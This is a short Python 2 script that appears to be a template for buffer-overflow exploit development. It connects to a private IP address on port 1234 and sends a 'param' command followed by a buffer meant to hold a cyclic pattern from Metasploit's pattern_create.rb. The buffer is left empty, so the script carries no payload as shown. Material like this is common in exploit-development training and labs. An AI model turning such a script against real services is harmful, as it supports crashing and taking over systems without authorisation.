#!/usr/bin/python
import sys,socket

#create buffer using pattern_create.rb and paste below
buffer = ""
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.2',1234))
    s.send(('param ' + buffer + '\r\n'))
    s.recv(1024)
    s.close()
except:
    print "Cannot connect"
